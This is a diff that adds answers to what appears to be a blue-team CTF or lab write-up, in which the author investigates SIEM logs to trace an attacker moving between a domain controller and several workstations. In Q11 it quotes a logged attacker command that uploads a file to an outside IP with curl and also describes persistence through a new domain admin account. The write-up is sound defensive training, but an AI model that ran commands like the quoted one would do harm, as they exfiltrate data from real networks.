@@ -170,31 +170,110 @@ Answer: `192.168.10.15`
 
 
 ### Q9: What is the username of the infected employee using 192.168.10.15?
+we need to filter for *192.168.10.15* as sourceip to see which user is related 
+
+![instractions](Images/18.png)
+
+then exclude null user 
+![instractions](Images/19.png)
+
+you will find the username *nour*
+
+![instractions](Images/20.png)
+
+Another way to answer is to use AQL an below
+
+![instractions](Images/21.png)
 
 
-
-
-
-Answer: ``
+Answer: `nour`
 
 
 
 ### Q10: Hackers do not like logging, what logging was the attacker checking to see if enabled?
+first, I filtered by eventid = *1102* which mean *The audit log was cleared* 
+but found nothing 
+
+![instractions](Images/22.png)
+
+then, I searched if he check *realtimemonitoring*, *realtimeprotection* or *Antivirus*
+by using commands like *Get-MpComputerStatus* or *Get-MpPreference*
+but also found nothing 
+
+
+![instractions](Images/23.png)
+
+After that, I filtered by `scriptblocklogging` becuase it's related to log powershell scripts
+
+![instractions](Images/24.png)
+
+open the event to show raw data 
+
+![instractions](Images/25.png)
 
 
 
+Answer: `powershell`
 
-Answer: ``
+
+
 
 
 ### Q11: Name of the second system the attacker targeted to cover up the employee?
 
+to answer this question you need big visibility to show all commands executed on machine
 
+filter by `eventid : 1` for preocess creation and `processcommandline = cmd`
+to see all commands excuted using cmd
 
-Answer: ``
+and then groupby `commandline` to focuse on commands
+
+and groupby `log source` to show all logs related to one machine
+
+![instractions](Images/26.png)
+
+as you can see the scenario in the image below
+
+![instractions](Images/27.png)
+
+the using of `\q \c` is indicator for malicious action
+on DC 
+  the attacker run `cd and whoami` to know more info about domain and other machine
+  then, he checked scriptblocklogging from registery
+  after that, he created a user `rambo` and add to domain admin group to maintain persistance 
+  then, `ls, dir` to gather more info
+   after that he navigate to `HD-FIN-02`
+
+on HD-FIN-02
+  gather info about the machine which it's user is `sarah`
+  then uplaoded the file named `sami.xlsx` to attacker ip using this command 
+  `cmd.exe /Q /c curl -X PUT --upload-file sami.xlsx http://192.20.80.25:8000 1> \\127.0.0.1\ADMIN$\__1604917392.4554174 2>&1`
+  then he deleted the file from sarah machine
+  after that he navigate to `MGNT-01`
+
+on MGNT-01
+  gather info usign windows commands `ls, dir....`
+  then deleted `sami.xlsx` also
+
+so, the second system is `MGNT-01`
+
+Answer: `MGNT-01`
 
 
 ### Q12: When was the first malicious connection to the domain controller (log start time - hh:mm:ss)?
+
+as we already know from Q8 that the first infected machine is `192.168.10.15`
+
+![instractions](Images/28.png)
+
+so, we need to show connections from 192.168.10.15 to DC after this date 
+
+by the way, the machine that has `192.168.10.15` is `HD-FIN-03`
+
+
+and the DC ip is `192.168.20.20`
+![instractions](Images/30.png)
+
 
 
 
